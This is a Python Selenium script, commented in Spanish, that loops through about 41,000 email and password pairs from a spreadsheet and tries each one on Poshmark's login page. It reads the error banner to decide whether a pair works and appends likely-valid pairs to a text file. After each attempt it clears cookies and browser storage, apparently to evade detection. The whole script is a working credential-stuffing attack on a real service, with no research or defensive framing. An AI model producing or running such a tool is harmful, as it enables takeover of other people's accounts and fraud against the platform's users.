from selenium import webdriver  # Importar Selenium Wire
from selenium.webdriver.common.by import By
from openpyxl import load_workbook
import time

proxy= "107.182.231.94:61694"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_experimental_option("debuggerAddress", "localhost:9222")



driver = webdriver.Chrome(options=chrome_options)
driver.get("https://poshmark.com/login")




ws = load_workbook("bbdd.xlsx")
wsd = ws["Sheet"]
contador = 80
numerofil = 41305 #NUMERO DE FILAS DE LA BASE DE DATOS

file = open("Cuentas.txt", "a")
while contador<=numerofil:

    convertidor = str(contador)
    A = wsd["A"+ convertidor]
    B = wsd["B"+ convertidor]

    input_element = driver.find_element(By.ID, "login_form_username_email")  # Cambia "campo_id" por el identificador real
        # Enviar texto al campo de entrada
    input_element.send_keys(A.value)
    input_element = driver.find_element(By.ID, "login_form_password")  # Cambia "campo_id" por el identificador real
        # Enviar texto al campo de entrada
    input_element.send_keys(B.value)
    driver.execute_script('document.querySelector("#email-login-form > form > div.form__actions.br--none.p--t--0.jc--sb.fw--w > button").click()')
    time.sleep(4)
    try:
            div_element = driver.find_element(By.CLASS_NAME, "error_banner")  # Reemplaza "mi_div" con el ID real
            texto = div_element.text
            if texto == "Invalid Username or Password":
                print("NO FUCIONA", str(contador))
            elif texto == "Please enter your login information and complete the captcha to continue.":
                print("Hay probabilidades de que entre")
                file.write(str(A.value) + "|" + str(B.value) +"|" +"\n")
    except:
            driver.get("https://poshmark.com/logout")
            driver.get("https://poshmark.com/login")
            print("HAY PROBABILIDAD DE QUE ENTRE ", A.value, ":", B.value)
            file.write(str(A.value) + "|" + str(B.value) +"|" +"\n")


       
    texto =""
    driver.execute_script("window.localStorage.clear();")
    driver.execute_script("window.sessionStorage.clear();")
    driver.delete_all_cookies()
    driver.refresh()
    contador = contador +1